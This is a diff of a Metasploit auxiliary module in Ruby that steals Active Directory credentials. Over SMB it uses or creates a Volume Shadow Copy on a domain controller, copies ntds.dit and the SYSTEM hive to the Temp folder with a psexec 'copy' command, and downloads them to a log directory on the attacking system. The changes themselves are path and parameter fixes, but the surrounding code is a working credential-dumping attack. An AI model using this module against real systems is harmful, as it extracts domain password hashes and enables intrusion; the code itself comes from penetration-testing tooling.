@@ -3,11 +3,11 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	# Exploit mixins should be called first
+	include Msf::Exploit::Remote::DCERPC
 	include Msf::Exploit::Remote::SMB
 	include Msf::Exploit::Remote::SMB::Authenticated
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
-	include Msf::Exploit::Remote::DCERPC
 
 	# Aliases for common classes
 	SIMPLE = Rex::Proto::SMB::SimpleClient
@@ -39,9 +39,8 @@ class Metasploit3 < Msf::Auxiliary
 		register_options([
 			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
 			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store the ntds.dit and SYSTEM hive', '/tmp/NTDS_Grab']),
-			#OptInt.new('RPORT', [true, 'The target port', 445]),
 			OptString.new('VSCPATH', [false, 'The path to the target Volume Shadow Copy', '']),
-			OptString.new('WINPATH', [true, 'The name of the Windows directory (examples: WINDOWS, WINNT)', '\WINDOWS\\']),
+			OptString.new('WINPATH', [true, 'The name of the Windows directory (examples: WINDOWS, WINNT)', 'WINDOWS']),
 		], self.class)
 
 		deregister_options('RHOST')
@@ -77,18 +76,18 @@ class Metasploit3 < Msf::Auxiliary
 				n = copy_ntds(ip, datastore['VSCPATH'])
 				s = copy_sys_hive(smbshare, ip)
 				if n && s
-					download_ntds(smbshare, (datastore['WINPATH'] + "Temp\\ntds"), ip, logdir)
-					download_sys_hive(smbshare, (datastore['WINPATH'] + "Temp\\sys"), ip, logdir)
+					download_ntds(smbshare, (datastore['WINPATH'] + "\\Temp\\ntds"), ip, logdir)
+					download_sys_hive(smbshare, (datastore['WINPATH'] + "\\Temp\\sys"), ip, logdir)
 				end
 			else
-				if vscpath = check_vss(smbshare, ip, text, bat)
+				if vscpath = check_vss(ip, text, bat)
 					#Check if VSC Already exists
 					n = copy_ntds(ip, vscpath)
 					s = copy_sys_hive(smbshare, ip)
 					if n && s
 						# If the above succeeds then we just have to download our files
-						download_ntds(smbshare, (datastore['WINPATH'] + "Temp\\ntds"), ip, logdir)
-						download_sys_hive(smbshare, (datastore['WINPATH'] + "Temp\\sys"), ip, logdir)
+						download_ntds(smbshare, (datastore['WINPATH'] + "\\Temp\\ntds"), ip, logdir)
+						download_sys_hive(smbshare, (datastore['WINPATH'] + "\\Temp\\sys"), ip, logdir)
 					end
 				else
 					# If VSC doesn't exists already then we see if we can create a new VSC
@@ -98,8 +97,8 @@ class Metasploit3 < Msf::Auxiliary
 						s = copy_sys_hive(smbshare, ip)
 						if n && s
 							# If the above succeeds then we just have to download our files
-							download_ntds(smbshare, (datastore['WINPATH'] + "Temp\\ntds"), ip, logdir)
-							download_sys_hive(smbshare, (datastore['WINPATH'] + "Temp\\sys"), ip, logdir)
+							download_ntds(smbshare, (datastore['WINPATH'] + "\\Temp\\ntds"), ip, logdir)
+							download_sys_hive(smbshare, (datastore['WINPATH'] + "\\Temp\\sys"), ip, logdir)
 						end
 					end
 				end
@@ -113,7 +112,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	# Thids method will check if a Volume Shadow Copy already exists and use that rather 
 	# then creating a new one
-	def check_vss(smbshare, ip, text, bat)
+	def check_vss(ip, text, bat)
 		begin
 			print_status("#{ip} - Checking if a Volume Shadow Copy exists already.")
 			# Check is VSC already exists
@@ -175,7 +174,7 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Copying ntds.dit to Windows Temp directory")
 		begin
 			# Try to copy ntds.dit from VSC
-			ntdspath = vscpath.to_s + datastore['WINPATH'] + "NTDS\\ntds.dit"
+			ntdspath = vscpath.to_s + "\\" + datastore['WINPATH'] + "\\NTDS\\ntds.dit"
 			command = "%COMSPEC% /C copy /Y #{ntdspath} %WINDIR%\\Temp\\ntds"
 			return psexec(command)
 		rescue StandardError => ntdscopyerror
